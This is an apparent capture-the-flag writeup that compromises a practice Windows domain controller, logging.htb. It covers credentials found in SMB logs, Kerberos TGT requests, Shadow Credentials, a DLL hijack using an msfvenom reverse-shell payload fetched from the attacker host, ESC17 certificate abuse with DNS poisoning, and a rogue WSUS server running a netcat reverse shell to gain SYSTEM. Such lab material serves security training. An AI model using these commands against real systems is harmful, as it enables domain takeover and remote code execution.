
## CTF Writeup: Logging

---
## Credentials

```
wallace.everette:Welcome2026@
```

## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.245.130
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 12:38 -0500
Nmap scan report for 10.129.245.130
Host is up (0.036s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-15 00:39:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-15T00:40:15+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-15T00:40:16+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-15T00:40:15+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-08-15T00:40:16+00:00; +7h00m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open  ssl/unknown
|_ssl-date: 2026-08-15T00:40:16+00:00; +7h00m02s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.logging.htb
| Not valid before: 2026-04-24T15:49:07
|_Not valid after:  2027-04-24T15:49:07
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49700/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49742/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC
49799/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-time: 
|   date: 2026-08-15T00:40:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.34 seconds
```

The target seems to be an DC. The TCP Scan also reveals information about multiple SAN's: dc01.logging.htb, logging.htb, logging, dc01. Let's map them all to the target ip address in our local dns file.

```
echo "10.129.245.130 dc01.logging.htb logging.htb logging dc01" | tee -a /etc/hosts
```

Started up BloodHound on my local machine.

```
bloodhound-start
```

Downloaded domain information using rusthound-ce.

```
rusthound-ce --domain logging.htb -u wallace.everette -p 'Welcome2026@'
```

Marked my current user wallace.everette as owned. He can enroll into the CA & some other Certificate Templates.

```

```



```

```

Enumerated SMB Shares & found 2 non-default Shares "WSUSTemp" & "Logs". We only have read permissions for the Logs Share.

```
nxc smb logging.htb -u wallace.everette -p 'Welcome2026@' --shares
```

Let's check it out! Downloaded all files.

```
smbclient \\\\logging.htb/Logs -U wallace.everette
Password for [WORKGROUP\wallace.everette]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 16 18:10:09 2026
  ..                                  D        0  Thu Apr 16 18:10:09 2026
  Audit_Heartbeat.log                 A     1294  Thu Apr 16 18:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 18:10:09 2026
  Service_State.log                   A      468  Thu Apr 16 18:10:09 2026
  TaskMonitor.log                     A     1170  Thu Apr 16 18:10:09 2026

                6657279 blocks of size 4096. 1558261 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Retrieved new credentials for an service account.

```
cat IdentitySync_Trace_20260219.log
```

```
svc_recovery:Em3rg3ncyPa$$2025
```

Marked this user as owned in BloodHound.

He seems to be having an interesting ACL "GenericWrite" for an Managed Service Account msa_health$. Let's try & abuse it! This didn't work, the authentication failed which is very odd.

```
certipy-ad shadow auto -u 'svc_recovery@logging.htb' -p Welcome2026@ -account msa_health$ -dc-ip 10.129.245.130
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[-] LDAP NTLM authentication failed: {'result': 49, 'description': 'invalidCredentials', 'dn': '', 'message': '8009030C: LdapErr: DSID-0C09089F, comment: AcceptSecurityContext error, data 52f, v4563\x00', 'referrals': None, 'saslCreds': None, 'type': 'bindResponse'}
[-] Got error: Kerberos authentication failed: {'result': 49, 'description': 'invalidCredentials', 'dn': '', 'message': '8009030C: LdapErr: DSID-0C09089F, comment: AcceptSecurityContext error, data 52f, v4563\x00', 'referrals': None, 'saslCreds': None, 'type': 'bindResponse'}
[-] Use -debug to print a stacktrace
```

Checked authentication & got server response that the account is restricted.

```
nxc smb logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'        
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
```

This status is returned when the credentials themselves are not the problem, but a policy prevents the logon method from being used, and the classic cause on a domain controller is membership in the Protected Users Group. Members of that Group are barred from NTLM Authentication and can only authenticate over Kerberos.

Verified if the service account is part of the restricted users & he is!

```
nxc ldap logging.htb -u wallace.everette -p 'Welcome2026@' --groups "Protected Users"
LDAP        10.129.245.130  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.245.130  389    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
LDAP        10.129.245.130  389    DC01             Administrator
LDAP        10.129.245.130  389    DC01             svc_recovery
```

Since we can only authenticate or use the service account via kerberos authentication we'll need to request an TGT in order to perform an ShadowCredentials Attack.

As we can see this didn't workout either, but the authentication failed. Since the password is 2025, let's try & use 2026.

```
impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2025'@10.129.245.130
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

As we can see we got an different error this time, which means authentication with the 2026 password worked! 

```
impacket-getTGT logging.htb/svc_recovery@10.129.245.130 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Let's fix clock skew.

```
ntpdate -s dc01.logging.htb
```

Successfully retrieved the TGT of the service account.

```
impacket-getTGT logging.htb/svc_recovery@10.129.245.130
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password: Em3rg3ncyPa$$2026
[*] Saving ticket in svc_recovery@10.129.245.130.ccache
```

Exported the ticket in our local kerberos cache.

```
export KRB5CCNAME=$(pwd)/svc_recovery@10.129.245.130.ccache
```

Performed Shadow Credentials Attack & gained NT Hash of msa_health$.

```
bloodyad --host dc01.logging.htb -d logging.htb -u svc_recovery -k add shadowCredentials 'msa_health$'
[+] KeyCredential generated with following sha256 of RSA key: ce3558a43552a487f779fccb58040d878bbc09d31317a5dbfde45f84ee4d8f25
[+] TGT stored in ccache file msa_health_zQ.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5
```

```
msa_health$:603fc24ee01a9409f83c9d1d701485c5
```

Checked if we can connect to the DC via evil-winrm & we can!

```
nxc winrm dc01.logging.htb -u msa_health$ -H 603fc24ee01a9409f83c9d1d701485c5        
WINRM       10.129.245.130  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) 
WINRM       10.129.245.130  5985   DC01             [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5 (Pwn3d!)
```

Marked the user as owned in BloodHound, but he didn't had any interesting.

Connected to the DC via evil-winrm.

```
evil-winrm -i dc01.logging.htb -u msa_health$ -H 603fc24ee01a9409f83c9d1d701485c5
```

Found an interesting monitor.ps1 script inside C:\Users\msa_health$\Documents.

This PowerShell script is a scheduled-task health monitor. It checks the state of a scheduled task named “UpdateChecker Agent” and builds a log message based on the result.

```
C:\Share\Logs\TaskMonitor.log
```

The script builds $Message, but it never actually writes it anywhere.

There is no:

Add-Content -Path $LogPath -Value $Message
Out-File -FilePath $LogPath -Append
Write-Output $Message

So as written, the script:

Does not create/update C:\Share\Logs\TaskMonitor.log
Does not print anything to the console
Only leaves the result in the variable $Message in the current PowerShell session

```
*Evil-WinRM* PS C:\Users\msa_health$\Documents> $TaskName = "UpdateChecker Agent"
*Evil-WinRM* PS C:\Users\msa_health$\Documents> $service = New-Object -ComObject "Schedule.Service"
*Evil-WinRM* PS C:\Users\msa_health$\Documents> $service.Connect()
*Evil-WinRM* PS C:\Users\msa_health$\Documents> $task = $service.GetFolder("\").GetTask($TaskName)
*Evil-WinRM* PS C:\Users\msa_health$\Documents> $task


Name               : UpdateChecker Agent
Path               : \UpdateChecker Agent
State              : 3
Enabled            : True
LastRunTime        : 8/14/2026 6:32:15 PM
LastTaskResult     : 0
NumberOfMissedRuns : 0
NextRunTime        : 8/14/2026 6:35:15 PM
Definition         : System.__ComObject
Xml                : <?xml version="1.0" encoding="UTF-16"?>
                     <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
                       <RegistrationInfo>
                         <Date>2026-04-16T16:39:34.3280175</Date>
                         <Author>logging\Administrator</Author>
                         <URI>\UpdateChecker Agent</URI>
                       </RegistrationInfo>
                       <Principals>
                         <Principal id="Author">
                           <UserId>S-1-5-21-4020823815-2796529489-1682170552-2105</UserId>
                           <LogonType>Password</LogonType>
                         </Principal>
                       </Principals>
                       <Settings>
                         <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
                         <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                         <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
                         <IdleSettings>
                           <StopOnIdleEnd>true</StopOnIdleEnd>
                           <RestartOnIdle>false</RestartOnIdle>
                         </IdleSettings>
                       </Settings>
                       <Triggers>
                         <TimeTrigger>
                           <StartBoundary>2026-04-16T16:38:15</StartBoundary>
                           <Repetition>
                             <Interval>PT3M</Interval>
                           </Repetition>
                         </TimeTrigger>
                       </Triggers>
                       <Actions Context="Author">
                         <Exec>
                           <Command>"C:\Program Files\UpdateMonitor\UpdateMonitor.exe"</Command>
                           <Arguments>500 /scan=3 /autofix=true</Arguments>
                         </Exec>
                       </Actions>
                     </Task>
```

We get information about the task running every 3 mins and executing an .exe file as "Administrator". Also the Script still doesn't write to any log file. It only defines the LogPath but never uses it. However the file may still exist.

```
C:\Share\Logs\TaskMonitor.log
C:\Program Files\UpdateMonitor\UpdateMonitor.exe
```

I enumerated the filesystem further & identified the .log file!

```
C:\ProgramData\UpdateMonitor\Logs\monitor.log
```

The file reveals that it wants to execute an Settings_Update.zip file and loads an settings_update.dll file, but fails!

```
No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
C:\Program Files\UpdateMonitor\bin\settings_update.dll
```

Let's create an malicious payload using msfvenom & zip it!

```
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.57 LPORT=445 --platform windows -f dll -o settings_update.dll
```

Zipped it up.

```
zip Settings_Update.zip settings_update.dll
```

Started up an python3 webserver inside the directory in which the .zip file is stored.

```
python3 -m http.server 80
```

Navigated into C:\ProgramData\UpdateMonitor & transfered my malicious .zip file.

```
iwr -uri http://10.10.14.57/Settings_Update.zip -OutFile Settings_Update.zip
```

This should now execute our malicious files after some time as the "Administrator" user & we should get an reverse connection.

Started up listener on port 445.

```
rlwrap nc -lvnp 445
```

Gained RCE as user "jaylee.clifton".

```
rlwrap nc -lvnp 445
listening on [any] 445 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.245.130] 53763
Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved user.txt in C:\Users\jaylee.clifton\Desktop.

```
9c41c8081114e0164fc937ef5d6c9c85
```
## Privilege Escalation

Enumerated his groups & permissions and found out that he seems to be part of the "IT" Group.

```
whoami /all
```

Marked him as owned in BloodHound. He seems to be part of Tier Zero and seems to be having one more Enroll Permission compared to other user's on an template called "UpdateSrv". I wanted to utilize certipy to check if the CA is vulnerable with his credentials to any ADCS Attacks, but since we don't have an password we could potentially utilize Kerberos Authentification. Since we have an valid shell as the user, let's get an TGT by using Rubeus.exe.

Transfered Rubeus.exe onto the target server.

```
certutil -urlcache -split -f http://10.10.14.57/Rubeus.exe Rubeus.exe
```

Requested an TGT.

```
Rubeus.exe tgtdeleg /nowrap
```

Stored it inside an file on my local machine.

```
mousepad jaylee.clifton.kirbi.b64
```

Decoded the ticket.

```
cat jaylee.clifton.kirbi.b64 | base64 -d > jaylee.clifton.kirbi
```

Converted the .kirbi format into an format my local machine can process (.ccache).

```
impacket-ticketConverter jaylee.clifton.kirbi jaylee.clifton.ccache
```

Exported the ticket into my kerberos cache.

```
export KRB5CCNAME=$(pwd)/jaylee.clifton.ccache
```

Let's now enumerate if any ADCS Attacks can be done with the new tier zero account.

```
certipy-ad find  -dc-ip 10.129.245.130 -target dc01.logging.htb -k -vulnerable -stdout
[+] User Enrollable Principals      : LOGGING.HTB\IT
    [!] Vulnerabilities
      ESC17                             : Enrollee supplies subject and template allows server authentication.
```

As we can see what BloodHound displayed us is true. The IT Group, which our current user is a part of is vulnerable to ESC17.

Which is an extremely unique ADCS Attack. It's an Active Directory Certificate Services (AD CS) misconfiguration classification. It occurs when a certificate template allows low-privileged users to request server authentication certificates with an enrollee-supplied Subject Alternative Name (SAN), which attackers can combine with weak DNS access controls to intercept secure traffic like HTTPS-enabled WSUS clients. 

Before performing the attack, I wanted to proceed with enumerating the filesystem with our current user shell.

I was able to find an interesting .html file. Let's download it via SMB Transfer.

Started up SMB Share on my local machine.

```
impacket-smbserver test . -smb2support -username saitama -password saitama
```

```
net use m: \\10.10.14.57\test /user:saitama saitama
```

Downloaded file.

```
copy Incident_4922_WSUS_Remediation_ViewExport.html m:\
```

Now opening the file was interesting:

```
open Incident_4922_WSUS_Remediation_ViewExport.html
```

![](Pasted%20image%2020260814223329.png)

It reveals information about an staging endpoint called "wsus.logging.htb", the DNS isn't set yet & there is an scheduled Task called "ForceSync" which probably tries to connect to the endpoint. 

The classic ESC17 Attack. We can perform DNS Poisoning, by adding an DNS Entry which will callback to our local machine. We'll then use the tool wsuks which executes an command as Administrator. 

Let's verify if we can add DNS Entries, by checking writable AD Objects.

```
KRB5CCNAME=jaylee.clifton.ccache bloodyad --host DC01.logging.htb -d logging.htb -k get writable
```

This revealed CREATE_CHILD permissions over logging.htb, which means we can add DNS Entries.

```
KRB5CCNAME=jaylee.clifton.ccache bloodyad --host dc01.logging.htb -d logging.htb -k add dnsRecord 'wsus' 10.10.14.57
```

Since the whole process is running on https, we'll need an valid certificate. Let's request this. 

```
KRB5CCNAME=jaylee.clifton.ccache certipy-ad req -u jaylee.clifton -k -dc-ip 10.129.245.130 -target dc01.logging.htb -ca logging-DC01-CA -template UpdateSrv -dns wsus.logging.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'wsus.pfx'
[*] Wrote certificate and private key to 'wsus.pfx'
```

Also added wsus.logging.htb to the target ip address in our local dns file.

```
mousepad /etc/hosts
```

Since the exploitation tool expects a PEM-formatted certificate, the PFX file is converted using OpenSSL:

```
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
```

This certificate will allow the attacker’s server to impersonate the legitimate WSUS server during TLS communication.
##### Installing WSUKS

- To perform the WSUS man-in-the-middle attack, the WSUKS tool is installed.

5. A dedicated Python virtual environment is created:

```
python -m venv myenv
```

6. Activate the environment

```
source myenv/bin/activate
```

7. Install the required dependencies:

```
sudo apt install pipx python3-nftables
```

8. Ensure the user’s local binaries are available:

```
pipx ensurepath
```

9. Install WSUKS:

```
pipx install wsuks --system-site-packages
```

10. Finally, create a symbolic link so the executable is available system-wide:

```
sudo ln -s ~/.local/bin/wsuks /usr/sbin/wsuks
```

11. Launching the Rogue WSUS Server

- The objective is simple. When the Domain Controller contacts what it believes is the legitimate WSUS server, it should instead connect to the attacker’s server.
- Rather than distributing a software update, WSUKS is instructed to execute a command that adds wallace.everette to the local Administrators group.
- The rogue WSUS server is started:

Started up netcat listener on port 53.

```
rlwrap nc -lvnp 53
```

```
sudo wsuks -t DC01.logging.htb --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 --serve-only -c '/accepteula /s cmd /k "C:\Temp\nc.exe 10.10.14.57 53 -e cmd.exe"'
```

Gained RCE as SYSTEM User.

```
rlwrap nc -lvnp 53 
listening on [any] 53 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.245.130] 63987
Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved root.txt in C:\Users\toby.brynleigh\Desktop.

```
4141ef1e6cb4cfdb102d257c17afefda
```